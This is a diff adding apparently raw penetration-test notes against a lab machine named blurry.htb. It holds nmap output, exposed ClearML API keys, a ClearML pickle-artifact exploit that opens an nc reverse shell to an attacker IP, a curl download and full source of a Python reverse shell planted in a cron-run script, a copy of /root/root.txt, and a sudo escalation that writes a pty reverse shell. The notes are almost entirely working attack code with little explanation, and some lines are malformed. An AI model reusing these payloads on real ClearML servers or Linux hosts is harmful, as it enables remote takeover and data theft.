@@ -1,0 +1,153 @@
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-09 12:53 CEST
+Nmap scan report for 10.10.11.19
+Host is up (0.039s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e21d5dc2e61eb8fa63b242ab71c05d3 (RSA)
+|   256 3911423f0c250008d72f1b51e0439d85 (ECDSA)
+|_  256 b06fa00a9edfb17a497886b23540ec95 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://app.blurry.htb/
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+api { 
+    web_server: http://app.blurry.htb
+    api_server: http://api.blurry.htb
+    files_server: http://files.blurry.htb
+    credentials {
+        "access_key" = "7FWQN4WEV7K6M1J69Z2S"
+        "secret_key"  = "V0FY6LztuzQ6Xgjma1vEuwsyuA1S5i49LGAIu4RowqMd5TBUe6"
+     
+     
+http://app.blurry.htb/api/v22.0/auth.create_credentials        
+        meta	
+id	"814d8ad62602425982ba8526698d171d"
+trx	"814d8ad62602425982ba8526698d171d"
+endpoint	
+name	"auth.create_credentials"
+requested_version	"22.0"
+actual_version	"1.0"
+result_code	200
+result_subcode	0
+result_msg	"OK"
+error_stack	""
+error_data	{}
+data	
+credentials	
+access_key	"J5KNSLHYLBEUBN3K8ICL"
+secret_key	"wLlJtbuF6HowW2jsZUk4q3uGECPsbuyEJojf8a3WNONgNgOKtt"
+    }
+}
+
+
+
+import pickle
+import os
+from clearml import Task
+
+class CMD:
+    def __reduce__(self):
+        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ''/bin/sh -i 2>&1 | nc 10.10.14.37 1337 > /tmp/f')  # Replace 'payload' with the actual command you want to execute. example: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ''/bin/sh -i 2>&1 | nc tun0 1337 > /tmp/f 
+        return os.system, (cmd,)
+
+task = Task.init(project_name='Black Swan', task_name='exploit', tags=["review"], output_uri=True)
+task.upload_artifact(name='pickle_artifact', artifact_object=CMD(), retries=2, wait_on_upload=True)
+
+
+╔══════════╣ PATH                                                                                                                                                                                                                           
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path abuses
+                                                                                                                                                     
+/usr/bin:/bin:/home/jippity/.local/bin
+                                       
+
+cron:
+
+/home/jippity/automation/review_tasks.py
+
+
+curl http://10.10.14.37/python_rev.py -o review_tasks.py
+
+
+echo "OST = "10.10.14.37"
+PORT = 8000
+
+def connect((host, port)):
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((host, port))
+	return s
+
+def wait_for_command(s):
+	data = s.recv(1024)
+	if data == "quit\n":
+		s.close()
+		sys.exit(0)
+	# the socket died
+	elif len(data)==0:
+		return True
+	else:
+		# do shell command
+		proc = subprocess.Popen(data, shell=True,
+			stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+			stdin=subprocess.PIPE)
+		stdout_value = proc.stdout.read() + proc.stderr.read()
+		s.send(stdout_value)
+		return False
+
+def main():
+	while True:
+		socket_died=False
+		try:
+			s=connect((HOST,PORT))
+			while not socket_died:
+				socket_died=wait_for_command(s)
+			s.close()
+		except socket.error:
+			pass
+		time.sleep(5)
+
+if __name__ == "__main__":
+	import sys,os,subprocess,socket,time
+	sys.exit(main())" >  review_tasks.py 
+	
+	
+	
+	
+	# import the module
+import shutil
+
+# Specify the path of the file you want to copy
+file_to_copy = '/root/root.txt'
+
+# Specify the path of the destination directory you want to copy to
+destination_directory = '/home/jippity/automation'
+
+# Use the shutil.copy() method to copy the file to the destination directory
+shutil.copy(file_to_copy, destination_directory)
+
+
+
+/opt/clearml/wrapper.sh 
+python3 -m jobs.async_urls_delete --fileserver-host http://fileserver:8081
+t        1322  0.0  0.0   5788   216 ?        Ss   Jun11   0:00 bash /opt/clearml/wrapper.sh apiserver
+root        1362  0.0  0.0   5788    88 ?        Ss   Jun11   0:00 bash /opt/clearml/wrapper.sh fileserver
+root        1546  0.0  0.3 190080 14024 ?        S    Jun11   0:13 python3 fileserver.py
+root        1636  0.4  2.0 1244352 82828 ?       Sl   Jun11   4:38 python3 -m apiserver.server
+
+
+User jippity may run the following commands on blurry:
+    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
+
+rm /models/evaluate_model.py
+echo 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.9",8000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh") ' > /models/evaluate_model.py
+
+sudo /usr/bin/evaluate_model /models/*.pth
+
+
+
+
+
+	
+	
